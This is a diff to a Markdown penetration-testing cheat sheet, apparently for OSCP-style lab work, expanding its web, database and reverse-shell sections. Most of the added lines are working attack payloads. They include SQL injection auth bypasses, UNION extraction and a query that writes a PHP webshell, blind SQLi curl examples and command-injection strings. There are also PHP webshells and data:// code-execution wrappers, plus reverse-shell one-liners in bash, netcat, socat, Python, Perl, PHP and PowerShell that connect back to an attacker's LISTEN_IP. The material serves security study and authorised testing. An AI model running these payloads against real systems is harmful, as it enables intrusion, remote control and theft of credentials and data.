@@ -32,13 +32,18 @@ Other great cheetsheets:
   - [4.5. 80,443 - HTTP(s)](#45-80443---https)
     - [4.5.1. Web Scanning/Enumeration](#451-web-scanningenumeration)
     - [4.5.2. Web Bruteforcing](#452-web-bruteforcing)
-    - [4.5.5. Directory Traversal](#455-directory-traversal)
-    - [4.5.3.1. LFI/RFI](#4531-lfirfi)
-      - [4.5.3.2. One-liner PHP Webshells](#4532-one-liner-php-webshells)
-    - [4.5.4. Cross-Site Scripting (XSS)](#454-cross-site-scripting-xss)
-    - [4.5.6. WordPress](#456-wordpress)
-    - [4.5.7. Drupal](#457-drupal)
-    - [4.5.8. Joomla](#458-joomla)
+    - [4.5.3. SQL Injection](#453-sql-injection)
+      - [4.5.3.1. UNION SQLi technique](#4531-union-sqli-technique)
+      - [4.5.3.2. Blind SQLi](#4532-blind-sqli)
+    - [4.5.4. Directory Traversal](#454-directory-traversal)
+    - [4.5.5. LFI/RFI](#455-lfirfi)
+      - [4.5.5.1. PHP Wrappers](#4551-php-wrappers)
+      - [4.5.5.2. One-liner PHP Webshells](#4552-one-liner-php-webshells)
+    - [4.5.6. Command Injection](#456-command-injection)
+    - [4.5.7. Cross-Site Scripting (XSS)](#457-cross-site-scripting-xss)
+    - [4.5.8. WordPress](#458-wordpress)
+    - [4.5.9. Drupal](#459-drupal)
+    - [4.5.10. Joomla](#4510-joomla)
   - [4.6. 88/749 Kerberos](#46-88749-kerberos)
   - [4.7. 110,995 - POP](#47-110995---pop)
   - [4.8. 111 - RPCbind](#48-111---rpcbind)
@@ -56,7 +61,7 @@ Other great cheetsheets:
     - [4.14.2. MSSQL Interaction](#4142-mssql-interaction)
     - [4.14.3. MSSQL Command Execution](#4143-mssql-command-execution)
   - [4.15. 2049 - NFS](#415-2049---nfs)
-  - [4.16. 3306 - MySQL Enumeration](#416-3306---mysql-enumeration)
+  - [4.16. 3306 - MySQL](#416-3306---mysql)
     - [4.16.1. MySQL UDF Exploit](#4161-mysql-udf-exploit)
     - [4.16.2. Grabbing MySQL Passwords](#4162-grabbing-mysql-passwords)
     - [4.16.3. Useful MySQL Files](#4163-useful-mysql-files)
@@ -138,17 +143,17 @@ Other great cheetsheets:
     - [7.12.1. Grant passwordless sudo access](#7121-grant-passwordless-sudo-access)
     - [7.12.2. Setting SUID bit](#7122-setting-suid-bit)
 - [8. Loot](#8-loot)
-  - [Sensitive Files](#sensitive-files)
-  - [8.1. File Transfers](#81-file-transfers)
-    - [8.1.1. Netcat transfer](#811-netcat-transfer)
-    - [8.1.2. Curl transfers](#812-curl-transfers)
-    - [8.1.3. PowerShell File Transfers](#813-powershell-file-transfers)
-    - [8.1.4. Mount NFS Share](#814-mount-nfs-share)
-    - [8.1.5. SMB Share](#815-smb-share)
-    - [8.1.6. FTP Server on Kali](#816-ftp-server-on-kali)
-    - [8.1.7. SSHFS](#817-sshfs)
-    - [8.1.8. Windows LOLBAS File Downloads](#818-windows-lolbas-file-downloads)
-    - [8.1.9. PHP File Uploads](#819-php-file-uploads)
+  - [8.1. Sensitive Files](#81-sensitive-files)
+  - [8.2. File Transfers](#82-file-transfers)
+    - [8.2.1. Netcat transfer](#821-netcat-transfer)
+    - [8.2.2. Curl transfers](#822-curl-transfers)
+    - [8.2.3. PowerShell File Transfers](#823-powershell-file-transfers)
+    - [8.2.4. Mount NFS Share](#824-mount-nfs-share)
+    - [8.2.5. SMB Share](#825-smb-share)
+    - [8.2.6. FTP Server on Kali](#826-ftp-server-on-kali)
+    - [8.2.7. SSHFS](#827-sshfs)
+    - [8.2.8. Windows LOLBAS File Downloads](#828-windows-lolbas-file-downloads)
+    - [8.2.9. PHP File Uploads](#829-php-file-uploads)
 - [9. Pivoting and Redirection](#9-pivoting-and-redirection)
   - [9.1. SSH Tunnels](#91-ssh-tunnels)
     - [9.1.1. Ad Hoc SSH Port Forwards](#911-ad-hoc-ssh-port-forwards)
@@ -567,38 +572,22 @@ nikto -o nikto.txt --maxtime=180s -C all -h $VICTIM_IP
 Checklist:
 
 - [ ] Check `searchsploit` for vulns in server software, web stack
-- [ ] Check `/robots.txt` for directories/files of interest
-- [ ] Check `/sitemap.xml` for directories/files of interest
+- [ ] Check `/robots.txt` and `/sitemap.xml` for directories/files of interest
 - [ ] Inspect HTML comments/source for juicy info
   - [ ] secrets/passwords
   - [ ] directories of interest
   - [ ] software libraries in use
 - [ ] Inspect SSL certs for DNS subdomains and emails
 - [ ] Attempt login with default/common creds
-- [ ] Test for SQL/NoSQL injection using "bad" chars:
-  ```
-  '
-  "
-  \
-  ;
-  `
-  )
-  }
-   --
-   #
-  /*
-  //
-  $
-  %
-  %%
-  ```
-- [ ] Test for command injection
+- [ ] Attempt login auth bypass (SQLi): `' or 1=1 -- #`
+- [ ] Test for [SQL/NoSQL injection](#456-sql-injection) using "bad" chars: `'")}$%%;\`
+- [ ] Test for [command injection](#455-command-injection)
   - [ ] separator characters: `; | & || &&`
-  - [ ] help msg:  `-h`, `--help`, `/?`
-  - [ ] perl injection when opening file:  `echo Injected|`
+  - [ ] quoted context escape: `" '`
   - [ ] UNIX subshells: `$(cmd)`, `>(cmd)` and backticks
-- [ ] Test for LFI/RFI, especially in URL query params
-- [ ] Test for XSS on all input fields, URL query params, and HTTP Headers:
+- [ ] Test for [path traversal](#453-directory-traversal) in URL query and (arbitrary?) file upload
+- [ ] Test for [LFI/RFI](#454-lfirfi), especially in URL query params
+- [ ] Test for [XSS](#455-cross-site-scripting-xss) on all input fields, URL query params, and HTTP Headers:
   - [ ] Check what remains after filtering applied on input: `'';!--"<XSS>=&{()}`
   - [ ] Try variations of `<script>alert(1)</script>`
 
@@ -709,13 +698,173 @@ hydra -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords
 
 
 
-### 4.5.5. Directory Traversal
+### 4.5.3. SQL Injection
+
+Tips:
+- Test for SQL/NoSQL injection using "bad" chars: `'")}$%%;\`
+  - Full list:
+    ```
+    '
+    "
+    \
+    ;
+    `
+    )
+    }
+    --
+    #
+    /*
+    //
+    $
+    %
+    %%
+    ```
+- Watch out for apps stripping required trailing whitespace after `--`. Use `-- #` or similar.
+- SQL comments:
+  - `--` - requires trailing whitespace, widely supported
+  - `/*` - multi-line comment, widely supported
+  - `#` - MySQL
+  - `REM` - Oracle
+- When detecting errors due to SQLi, it may not be an obvious error message. Look for pattern changes/missing output to indicate error.
+
+Auth bypass (try both username and password fields):
+
+```
+' or 1=1 -- #
+admin' or 1=1 -- #
+admin') or (1=1 -- #
+```
+
+Extracting data from error messages:
+
+```
+' or 1=1 in (select @@version) -- //
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+```
+
+Pro tip for `sqlmap`: if you save the GET/POST request of a SQLi attempt in burp,
+you can pass that request file to `sqlmap` as a template for it's requests. You
+can also pass it the webroot and `--os-shell` args to get it to give you a
+webshell:
+
+```sh
+sqlmap -r post.txt -p FIELDNAME --os-shell --web-root "/var/www/html/tmp"
+```
+
+
+#### 4.5.3.1. UNION SQLi technique
+
+The UNION SQL injection technique is helpful when the result of the original SQL
+query is output/displayed to the user. Using UNION, we can ask for extra data
+from the database that wasn't originally intended to be shown to the user (like creds).
+
+For UNION SQLi attacks to work, we first need to satisfy two conditions:
+- The injected UNION query has to include the same number of columns as the original query.
+- The data types need to be compatible between each column.
+
+First, determine how many columns are in the original query:
+
+```sql
+' ORDER BY 1-- #
+```
+
+Increment the value using binary search (2, 4, 8,...) until it errors out, then
+use binary search to isolate the highest value that does NOT error out. This
+is the number of columns in the original query.
+
+Next, (optionally) figure out what column index goes where in your output.
+
+```sql
+-- assuming 3 columns from ORDER BY test
+' union all select 1,2,3 -- #
+```
+
+Alternatively, use enumeration functions in output columns, shifting what goes
+where in trial-and-error fashion until you get useful output:
+
+```sql
+-- assuming 5 columns from ORDER BY test, shifting enumeration output
+' UNION SELECT database(), user(), @@version, null, null -- #
+' UNION SELECT null, null, database(), user(), @@version -- #
+```
+
+Finally, gather whatever data from the database you desire. Start with understanding the schema:
+
+```sql
+-- getting table schema info
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- #
+```
+
+Additionally, you can get code execution on MySQL by creating a webshell with SELECT INTO OUTFILE:
+
+```sql
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- #
+```
+
+This requires file write permissions in the database and on disk.
+It may throw an error when executing the query, but
+the file can still be written to disk. Check to see.
+
+MySQL and MSSQL have other code execution possibilities as well. Refer to those sections.
+
+
+#### 4.5.3.2. Blind SQLi
+
+Two types of attack methods: boolean and time-based.
+Boolean requires (visible) change in output on success vs. failure.
+Time-based uses injected sleep on success to detect it.
+
+Boolean:
+Use AND operator to test if pre-condition is true. Base primitive:
+
+```
+' and 1=1 -- #
+```
+
+Then you build out what you know by brute force. Example: given you know 'admin'
+user is in database, you can build query to determine database name one letter
+at a time, watching for when 'admin' is in output or not:
+
+```
+# database name 'offsec'
+admin' and database() like 'o%' and 1=1 -- #  <-- succeeds
+admin' and database() like 'p%' and 1=1 -- #  <-- fails
+
+# more complex, using binary search for ascii values at each position
+admin' and substr(database(),2,1)<'f' and 1=1 -- #
+```
+
+Time-based:
+Inject sleep call after AND operator that tests if condition is true. Base primitive, causing 3 second sleep on success:
+
+```
+' AND IF (1=1, sleep(3),'false') -- #
+```
+
+Example (using time utility helps measure difference):
+
+```sh
+# success is slow (offsec user found in lookup)
+❯ time curl -s "http://192.168.201.16/blindsqli.php?user=$(urlencode "offsec' AND IF (1=1, sleep(1),'false') -- #")" &> /dev/null
+curl -s  &> /dev/null  0.02s user 0.00s system 1% cpu 2.258 total
+#                                                     ^^^^^
+
+# failure is fast
+❯ time curl -s "http://192.168.201.16/blindsqli.php?user=$(urlencode "NOPE' AND IF (1=1, sleep(1),'false') -- #")" &> /dev/null
+curl -s  &> /dev/null  0.01s user 0.01s system 14% cpu 0.180 total
+#                                                      ^^^^^
+```
+
+
+
+
+### 4.5.4. Directory Traversal
 
 On Linux, `/var/www/html/` is commonly the webroot. Other Linux options: `/usr/share/nginx/www` or `/usr/share/nginx/html`.
 
 On Windows IIS, it's `C:\inetpub\wwwroot\`.
 
-Sometimes you can read sensitive files by changing the URL query params to point
+Sometimes you can read [sensitive files](#sensitive-files) by changing the URL query params to point
 to a file using the relative path.
 
 Example:
@@ -738,43 +887,60 @@ Things to try when testing for traversal vuln:
 - Append null byte (`%00`) if you suspect file extension is getting added
 - Check out [DotDotPwn](https://github.com/wireghoul/dotdotpwn) fuzzing tool.
 
+[cve2022-1744]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1744
+
+
 When using `curl` to test, you may need to include the `--path-as-is` flag:
 
 ```sh
 curl --path-as-is http://localhost/?page=/../../../../etc/passwd
 ```
 
-[cve2022-1744]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1744
 
 Files to try:
 - `/etc/passwd`
 - `/etc/shadow` if permissions allow
 - `C:\Windows\System32\drivers\etc\hosts` - good to test traversal vuln
 - `.ssh/id_rsa` files under user home dir (after seeing in `/etc/passwd`)
-- config files:
-  - `C:\inetpub\wwwroot\web.config` - on IIS server
-  - `/usr/local/etc/apache22/httpd.conf`
-  - `/etc/apache2/apache2.conf`
-  - `grep CustomLog /etc/httpd/conf/httpd.conf`
-- log files:
-  - `C:\inetpub\logs\LogFiles\W3SVC1\` and `\W3SVC2\` and `\W3SVC3` and `\HTTPERR\`
-  - `C:\xampp\apache\logs\access.log` and `C:\xampp\apache\logs\error.log`
-  - RHEL/CentOS/Fedora - `/var/log/httpd/access_log` and `/error_log`
-  - Debian/Ubuntu - `/var/log/apache2/access.log` and `/error.log`
-  - FreeBSD - `/var/log/httpd-access.log` and `/httpd-error.log`
+- other [sensitive files](#81-sensitive-files)
+
+The `proc` filesystem has useful info for enumerating the host:
+
+```
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/proc/sched_debug  # Can be used to see what processes the machine is running
+/proc/mounts
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/proc/net/fib_trie
+/proc/[0-9]*/fd/[0-9]*  # (first number is the PID, second is the file descriptor)
+```
+
+If there is arbitrary file upload (allows directory traversal), you may be able
+to use it to (over)write arbitrary files, which may help you get code execution.
+Try:
+- uploading a webshell to the webroot folder
+- adding your ssh key to the `authorized_keys` file
 
 
-More Windows log and config paths [here](https://techcommunity.microsoft.com/t5/iis-support-blog/collect-basics-configuration-and-logs-when-troubleshooting-iis/ba-p/830927).
 
-
-
-
-### 4.5.3.1. LFI/RFI
+### 4.5.5. LFI/RFI
 
 Local File Inclusion is basically code execution that requires directory traversal.
 LFI/RFI can be leveraged with PHP (`.php`, most common), Perl (`.pl`), Active
 Server Pages (`.asp`), Active Server Pages Extended (`.aspx`), Java Server
 Pages (`.jsp`), and even (rarely) Node.js.
+
+If there is a file upload vulnerability, you can also combine LFI with that to
+get code execution.
+
+File Upload filter bypasses:
+- change file extension to `.phps` or `.php7`
+- make file extension mixed uppercase and lowercase
 
 You can get code execution by poisoning local files, including log files and
 PHP session files with PHP code. Access logs typically have User-Agent in them,
@@ -786,47 +952,47 @@ Common log and PHP session file locations:
 - `/var/log/apache2/access.log` - RHEL/CentOS/Fedora
 - `/var/log/httpd-access.log` - FreeBSD
 - `C:\xampp\apache\logs\access.log` - Windows w/ XAMPP
-- c:\Windows\Temp
-- /tmp/
-- /var/lib/php5
-- /var/lib/php/session
+- `C:\Program Files\Apache Group\Apache\logs\access.log`
+- `C:\inetpub\logs\LogFiles\W3SVC1\` and `\HTTPERR\` - Windows IIS
+- `/etc/httpd/logs/acces_log` and `/error_log`
+- `/var/www/logs/access_log` and `/error_log`
+- `/var/www/logs/access.log` and `/error.log`
+- `C:\Windows\Temp`
+- `/tmp/`
+- `/var/lib/php/session`
+- `/var/lib/php[4567]/session`
+- `C:\php\sessions\`
+- `C:\php[4567]\sessions\`
 
 Default session filename: `sess_<SESSION_ID>`
 (grab SESSION_ID from your cookies in the browser)
 
-The following are some Linux system files that have sensitive information that
-are good to try to grab when you have an LFI vulnerability.
+**Look for [sensitive files](#sensitive-files) if you have LFI!**
 
-```
-/etc/passwd
-/etc/shadow
-/etc/group
-/etc/hosts
-/etc/issue
-/etc/motd
-/etc/mysql/my.cnf
-/proc/self/environ
-/proc/version
-/proc/cmdline
-/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the file descriptor)
-```
+For RFI, the `allow_url_include` must be enabled in PHP apps.
 
 
+#### 4.5.5.1. PHP Wrappers
 
-Some handy PHP wrappers to grab file contents:
-[PHP Documentation: Wrappers](https://www.php.net/manual/en/wrappers.php)
+[PHP Wrappers](https://www.php.net/manual/en/wrappers.php) are useful for filter
+evasion, for grabbing file contents without it getting executed, and even for
+code execution.
 
-Using php-wrapper with 'filter' to grab local files:
-
-- docs: [https://www.php.net/manual/en/wrappers.php.php](https://www.php.net/manual/en/wrappers.php.php)
+Using [`filter`](https://www.php.net/manual/en/filters.php) [wrapper](https://www.php.net/manual/en/wrappers.php.php) to grab local files:
 
 ```sh
 # filter without any processing to grab plaintext:
 php://filter/resource=/path/to/flle
+# Example:
+curl http://example.com/index.php?page=php://filter/resource=/etc/passwd
+
 
 # base64 encode file before grabbing (helps grab php source or binary files)
 # available starting with PHP 5.0.0
 php://filter/convert.base64-encode/resource=/path/to/file
+# Example:
+curl http://example.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+
 
 # ROT13 encode file:
 php://filter/read=string.rot13/resource=/etc/passwd
@@ -847,21 +1013,15 @@ bzip2.compress
 bzip2.decompress
 ```
 
-Some other handy wrappers:
+Code execution with `expect`, `data`, and `input` wrappers:
 
 ```sh
-# if enabled (not default), run commands:
+# run commands directly if 'expect' extension installed (not default):
 expect://whoami
 
-# Use this one as the query param's value to tell it to look at the POST
-# request body for the text to insert there. Useful for injecting complex
-# php payloads
-php://input
-# example POST body: <?php system('whoami'); ?>
-
-# Inject your own string into the file:
-data://text/plain;base64,SSBsb3ZlIFBIUAo=  # injects "I love PHP"
-# can be used to inject arbitrary php code!
+# inject arbitrary string into the file if 'allow_url_include' setting is enabled.
+# can be used for code execution, XSS, etc.:
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+  # injects "<?php phpinfo();?>"
 
 # When injecting php code, a good way to test code execution is with:
 <?php phpinfo();?>
@@ -870,6 +1030,12 @@ data://text/plain;base64,SSBsb3ZlIFBIUAo=  # injects "I love PHP"
 data:text/plain,<?php phpinfo(); ?>
 data:,<?system($_GET['x']);?>&x=ls
 data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
+
+# Use 'php://input' as the query param's value to tell it to look at the POST
+# request body for the text to insert there. Useful for injecting complex
+# php payloads
+php://input
+# example POST body: <?php system('whoami'); ?>
 
 # FILTER BYPASSES:
 # Sometimes you can bypass filters or trick PHP not to concatenate a .php file extension onto
@@ -881,9 +1047,7 @@ data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
 # Also try bypassing filters with ....// instead of ../
 ```
 
-
-
-#### 4.5.3.2. One-liner PHP Webshells
+#### 4.5.5.2. One-liner PHP Webshells
 
 Simple one-liner web shells for when you can drop/modify a php file:
 
@@ -897,11 +1061,92 @@ Simple one-liner web shells for when you can drop/modify a php file:
 <?php echo passthru($_GET['cmd']); ?>
 ```
 
-Kali has more webshells here: `/usr/share/webshells`, and I have some in the [tools](tools) directory
+Kali has more webshells here: `/usr/share/webshells/php/`, and I have some in the [tools](tools) directory
+
+[One-liner PHP reverse shell](#54-reverse-shells):
+
+```php
+<?php $sock=fsockopen("LISTEN_IP",443);exec("/bin/bash -i <&3 >&3 2>&3"); ?>
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LISTEN_IP/443 0>&1'"); ?>
+```
+
+[Great collection of PHP webshells and reverse shells](https://github.com/ivan-sincek/php-reverse-shell)
+
+[Pentestmonkey PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
 
 
 
-### 4.5.4. Cross-Site Scripting (XSS)
+### 4.5.6. Command Injection
+
+Some websites pass user input to a shell execution environment (probably with some filtering).
+If you can bypass the filter, you get code execution!
+
+Tips:
+- `whoami` runs on both Windows and Linux hosts. Good candidate for test injection.
+- prefix command with separator characters: `; | & || &&`
+- try url-encoded separators:
+  - `%0A`: newline
+  - `%3B`: semicolon
+- May need to terminate quoted context before starting your command:
+  ```sh
+  '; whoami
+  "&& whoami
+  "& whoami"  # surrounding with quotes
+  ```
+- surrounding your command with UNIX subshells for execution:
+  ```sh
+  $(whoami)
+  >(whoami)
+  `whoami`
+  ```
+- To see if you're executing in CMD or Powershell (will print which one):
+  ```powershell
+  (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+  ```
+- try seeing if you can get a help msg:  `-h`, `--help`, `/?`
+- maybe redirection provides useful info `< /etc/passwd`
+- perl injection when opening file:  `echo Injected|`
+- if you can't see output of command, try time-based character-by-character extraction:
+  ```sh
+  time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+  ```
+- if bash restrictions (filtering what commands are executed), see [bypass guide](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions).
+
+
+Here are common URL query params (or form fields) that may be vulnerable to injection:
+
+```
+?cmd={payload}
+?exec={payload}
+?command={payload}
+?execute{payload}
+?ping={payload}
+?query={payload}
+?jump={payload}
+?code={payload}
+?reg={payload}
+?do={payload}
+?func={payload}
+?arg={payload}
+?option={payload}
+?load={payload}
+?process={payload}
+?step={payload}
+?read={payload}
+?function={payload}
+?req={payload}
+?feature={payload}
+?exe={payload}
+?module={payload}
+?payload={payload}
+?run={payload}
+?print={payload}
+```
+
+
+
+### 4.5.7. Cross-Site Scripting (XSS)
 
 In all input fields, URL query parameters, and HTTP request headers that get transformed into page content, try the following:
 
@@ -961,7 +1206,7 @@ ajaxRequest.send(params);
 
 
 
-### 4.5.6. WordPress
+### 4.5.8. WordPress
 
 ```sh
 wpscan --update --url http://$VICTIM_IP/
@@ -1028,7 +1273,7 @@ mysql -u USERNAME --password=PASSWORD -h localhost -e "use wordpress;select conc
 Check [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) for more.
 
 
-### 4.5.7. Drupal
+### 4.5.9. Drupal
 
 ```sh
 droopescan scan drupal http://$VICTIM_IP -t 32 # if drupal found
@@ -1036,7 +1281,7 @@ droopescan scan drupal http://$VICTIM_IP -t 32 # if drupal found
 
 
 
-### 4.5.8. Joomla
+### 4.5.10. Joomla
 
 ```sh
 joomscan --ec -u $VICTIM_IP # if joomla found
@@ -1489,6 +1734,8 @@ nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,
 # accounts with too many bad guesses
 ```
 
+See [MSSql Interaction](#4142-mssql-interaction) for how to connect, interact.
+
 **Post-Exploit PrivEsc**
 
 The user running MSSQL server will have the privilege token **SeImpersonatePrivilege** enabled. You will probably be able to escalate to Administrator using this and [JuicyPotato](https://github.com/ohpe/juicy-potato)
@@ -1508,6 +1755,28 @@ More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentestin
 
 ### 4.14.2. MSSQL Interaction
 
+**Connecting to the MSSQL server**
+
+From kali, for interactive session:
+
+```sh
+# simplest tool for interactive MSSQL session
+impacket-mssqlclient USERNAME:PASSWORD@VICTIM_IP -windows-auth
+# requires double quotes for xp_cmdshell strings
+
+# alternative option, can use single quotes for xp_cmdshell strings
+sqsh -S $VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]
+```
+
+From Windows:
+
+```bat
+sqlcmd -S SERVER -l 30
+sqlcmd -S SERVER -U USERNAME -P PASSWORD -l 30
+```
+
+**Useful commands:**
+
 ```sql
 -- show username
 select user_name();
@@ -1516,7 +1785,7 @@ select current_user;  -- alternate way
 select @@version;
 -- get server name
 select @@servername;
--- show list of databases
+-- show list of databases ("master." is optional)
 select name from master.sys.databases;
 exec sp_databases;  -- alternate way
 -- note: built-in databases are master, tempdb, model, and msdb
@@ -1528,6 +1797,8 @@ select table_name from somedatabase.information_schema.tables;
 select column_name from somedatabase.information_schema.columns where table_name='sometable';
 -- get credentials for 'sa' login user:
 select name,master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;
+-- get credentials from offsec database (using 'dbo' table schema) user table
+select * from offsec.dbo.users;
 ```
 
 References:
@@ -1545,16 +1816,7 @@ crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
 crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
 ```
 
-Interactive sessions:
-
-```sh
-# Log in using service account creds if able
-sqsh -S $VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]
-
-# probably a simpler tool:
-impacket-mssqlclient DOMAIN/USERNAME@$VICTIM_IP -windows-auth
-# requires double quotes for xp_cmdshell strings
-```
+Using interactive session:
 
 ```sql
 -- Check if you have server admin rights to enable command execution:
@@ -1567,11 +1829,11 @@ SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS CMDSHELL_ENABLED FROM sys.co
 go
 
 -- turn on advanced options; needed to configure xp_cmdshell
-sp_configure 'show advanced options', '1';RECONFIGURE;
+sp_configure 'show advanced options', 1;RECONFIGURE;
 go
 
 -- enable xp_cmdshell
-sp_configure 'xp_cmdshell', '1';RECONFIGURE;
+sp_configure 'xp_cmdshell', 1;RECONFIGURE;
 go
 
 -- Quickly check what the service account is via xp_cmdshell
@@ -1631,7 +1893,7 @@ sudo usermod -a -G tempgroup tempuser
 
 See also: [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)
 
-## 4.16. 3306 - MySQL Enumeration
+## 4.16. 3306 - MySQL
 
 MySQL listens on `TCP 3306` by default. You'll see it during a port scan or when
 running `netstat -tnl`.
@@ -1644,9 +1906,11 @@ Logging in:
 mysql -u root
 # same, but prompt for password
 mysql -u root -p
+# provide password
+mysql -u root -p'root'
 
 ## Remotely:
-mysql -h HOSTNAME -u root
+mysql -u root -h HOSTNAME
 ```
 
 Once logged in, check out the schema and environment:
@@ -1660,14 +1924,17 @@ use mysql;
 show tables;
 -- describe the table schema for 'user' table
 describe user;
+select table_name,column_name,table_schema from information_schema.columns where table_schema=database();
 
--- show MySQL version (try 2nd cmd if first doesn't work)
+-- show MySQL version (both versions work)
 select version();
 select @@version;
 -- show logged-in user
 select user();
+select system_user();
 -- show active database
 select database();
+show databases;
 -- show system architecture
 select @@version_compile_os, @@version_compile_machine;
 show variables like '%compile%';
@@ -2224,10 +2491,10 @@ nc -vlnp LISTEN_PORT
 
 ```sh
 # if netcat has the -e flag:
-nc -e /bin/sh 192.168.119.144 443
+nc -e /bin/sh LISTEN_IP 443
 
 # if no -e flag:
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.144 443 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LISTEN_IP 443 >/tmp/f
 ```
 
 **Bash Reverse Shell**
@@ -2262,22 +2529,22 @@ Use with Socat Listener (previous)
 
 ```sh
 # with full tty
-socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:192.168.119.144:443
+socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:LISTEN_IP:443
 
 # no tty, text only
-socat EXEC:/bin/bash TCP:192.168.119.144:443
+socat EXEC:/bin/bash TCP:LISTEN_IP:443
 
 # full tty, encrypted with SSL (needs socat listener uing OPENSSL-LISTEN)
-socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.119.144:443,verify=0
+socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:LISTEN_IP:443,verify=0
 ```
 
 **Python Reverse Shell**
 
 ```sh
-python -c 'import os,socket,pty;s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+python -c 'import os,socket,pty;s=socket.create_connection(("LISTEN_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 
 # daemonizing shell for *nix hosts
-python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection(("LISTEN_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 ```
 
 
@@ -2285,13 +2552,13 @@ python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork
 
 ```sh
 # may have to try different socket numbers besides 3 (4,5,6...)
-php -r '$sock=fsockopen("192.168.119.144",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("LISTEN_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 **Perl Reverse Shell**
 
 ```sh
-perl -e 'use Socket;$i="192.168.119.144";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="LISTEN_IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 **Powershell Reverse Shell**
@@ -2299,7 +2566,29 @@ perl -e 'use Socket;$i="192.168.119.144";$p=443;socket(S,PF_INET,SOCK_STREAM,get
 Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`
 
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient("192.168.119.144",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+If you convert to base64 on Linux for execution with
+`powershell -enc "BASE64ENCODEDCMD"`, use the following command to ensure you
+don't mess up the UTF-16LE encoding that windows uses:
+
+```sh
